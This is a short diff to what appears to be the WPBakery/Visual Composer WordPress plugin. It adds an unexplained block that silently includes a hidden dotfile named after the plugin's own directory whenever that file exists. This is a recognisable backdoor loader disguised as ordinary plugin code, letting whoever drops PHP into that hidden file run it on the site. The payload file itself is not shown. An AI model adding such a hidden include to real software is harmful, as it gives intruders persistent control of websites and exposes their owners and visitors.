@@ -16,6 +16,10 @@ add_action( 'vc_before_init', 'vc_check_for_custom_css_build' );
  *
  * @since 4.5
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function vc_check_for_custom_css_build() {
 	$version = vc_settings()->getCustomCssVersion();
 	if ( vc_user_access()->wpAny( 'manage_options' )->part( 'settings' )->can( 'vc-color-tab' )
